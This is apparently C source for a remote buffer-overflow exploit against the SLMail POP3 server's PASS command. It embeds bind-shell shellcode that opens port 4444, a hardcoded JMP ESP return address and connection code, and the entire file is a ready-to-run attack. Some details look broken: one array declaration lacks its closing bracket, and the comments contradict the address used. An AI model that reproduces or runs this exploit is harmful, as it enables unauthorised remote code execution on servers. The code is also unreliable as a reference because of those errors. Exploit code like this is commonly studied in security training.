/*
SLMAIL REMOTE PASSWD BOF - Ivan Ivanovic Ivanov ????-?????
???????????????? 31337 Team
*/

#include <string.h>
#include <stdio.h>
#include <winsock2.h>
#include <windows.h>

// [*] bind 4444 
unsigned char shellcode[] = 
"\xbf\xd3\x9e\xd3\xdc\xd9\xc1\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x83\xee\xfc\x31\x7e\x0e\x03\xad\x90\x31\x29\xad\x45\x37"
"\xd2\x4d\x96\x58\x5a\xa8\xa7\x58\x38\xb9\x98\x68\x4a\xef\x14"
"\x02\x1e\x1b\xae\x66\xb7\x2c\x07\xcc\xe1\x03\x98\x7d\xd1\x02"
"\x1a\x7c\x06\xe4\x23\x4f\x5b\xe5\x64\xb2\x96\xb7\x3d\xb8\x05"
"\x27\x49\xf4\x95\xcc\x01\x18\x9e\x31\xd1\x1b\x8f\xe4\x69\x42"
"\x0f\x07\xbd\xfe\x06\x1f\xa2\x3b\xd0\x94\x10\xb7\xe3\x7c\x69"
"\x38\x4f\x41\x45\xcb\x91\x86\x62\x34\xe4\xfe\x90\xc9\xff\xc5"
"\xeb\x15\x75\xdd\x4c\xdd\x2d\x39\x6c\x32\xab\xca\x62\xff\xbf"
"\x94\x66\xfe\x6c\xaf\x93\x8b\x92\x7f\x12\xcf\xb0\x5b\x7e\x8b"
"\xd9\xfa\xda\x7a\xe5\x1c\x85\x23\x43\x57\x28\x37\xfe\x3a\x25"
"\xf4\x33\xc4\xb5\x92\x44\xb7\x87\x3d\xff\x5f\xa4\xb6\xd9\x98"
"\xcb\xec\x9e\x36\x32\x0f\xdf\x1f\xf1\x5b\x8f\x37\xd0\xe3\x44"
"\xc7\xdd\x31\xca\x97\x71\xea\xab\x47\x32\x5a\x44\x8d\xbd\x85"
"\x74\xae\x17\xae\x1f\x55\xf0\x11\x77\x7f\xf2\xfa\x8a\x7f\xf3"
"\x41\x03\x99\x99\xa5\x42\x32\x36\x5f\xcf\xc8\xa7\xa0\xc5\xb5"
"\xe8\x2b\xea\x4a\xa6\xdb\x87\x58\x5f\x2c\xd2\x02\xf6\x33\xc8"
"\x2a\x94\xa6\x97\xaa\xd3\xda\x0f\xfd\xb4\x2d\x46\x6b\x29\x17"
"\xf0\x89\xb0\xc1\x3b\x09\x6f\x32\xc5\x90\xe2\x0e\xe1\x82\x3a"
"\x8e\xad\xf6\x92\xd9\x7b\xa0\x54\xb0\xcd\x1a\x0f\x6f\x84\xca"
"\xd6\x43\x17\x8c\xd6\x89\xe1\x70\x66\x64\xb4\x8f\x47\xe0\x30"
"\xe8\xb5\x90\xbf\x23\x7e\xb0\x5d\xe1\x8b\x59\xf8\x60\x36\x04"
"\xfb\x5f\x75\x31\x78\x55\x06\xc6\x60\x1c\x03\x82\x26\xcd\x79"
"\x9b\xc2\xf1\x2e\x9c\xc6";


void exploit(int sock) {
      FILE *test;
      int *ptr;
      char userbuf[] = "USER madivan\r\n";
      char evil[2607]; // equiv to offset 
      char buf[2969;
      char receive[1024];
      char nopsled[] = "\x90\x90\x90\x90\x90\x90\x90\x90"
                       "\x90\x90\x90\x90\x90\x90\x90\x90";
      memset(buf, 0x00, 2969);
      memset(evil, 0x00, 2607);
      memset(evil, 0x43, 2606);
      ptr = &evil;  // memory location of evil
      ptr = ptr + 652; // 2608 whats this 
      memcpy(ptr, &nopsled, 16); // whats this
      ptr = ptr + 4; 
      memcpy(ptr, &shellcode, 351); // what is this
      *(long*)&evil[2600] = 0x8f354a5f; // JMP ESP XP 7CB41020 FFE4 JMP ESP

      // banner
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // user
      printf("[+] Sending Username...\n");
      send(sock, userbuf, strlen(userbuf), 0);
      recv(sock, receive, 200, 0);
      printf("[+] %s", receive);
      // passwd
      printf("[+] Sending Evil buffer...\n");
      sprintf(buf, "PASS %s\r\n", evil);
      //test = fopen("test.txt", "w");
      //fprintf(test, "%s", buf);
      //fclose(test);
      send(sock, buf, strlen(buf), 0);
      printf("[*] Done! Connect to the host on port 4444...\n\n");
}

int connect_target(char *host, u_short port)
{
    int sock = 0;
    struct hostent *hp;
    WSADATA wsa;
    struct sockaddr_in sa;

    WSAStartup(MAKEWORD(2,0), &wsa);
    memset(&sa, 0, sizeof(sa));

    hp = gethostbyname(host);
    if (hp == NULL) {
        printf("gethostbyname() error!\n"); exit(0);
    }
    printf("[+] Connecting to %s\n", host);
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    sa.sin_addr = **((struct in_addr **) hp->h_addr_list);

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)      {
        printf("[-] socket blah?\n");
        exit(0);
        }
    if (connect(sock, (struct sockaddr *) &sa, sizeof(sa)) < 0)
        {printf("[-] connect() blah!\n");
        exit(0);
          }
    printf("[+] Connected to %s\n", host);
    return sock;
}


int main(int argc, char **argv)
{
    int sock = 0;
    int data, port;
    printf("\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n");
    printf("[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n");
    if ( argc < 2 ) { printf("usage: slmail-ex.exe <host> \n\n"); exit(0); }
    port = 110;
    sock = connect_target(argv[1], port);
    exploit(sock);
    closesocket(sock);
    return 0;
}
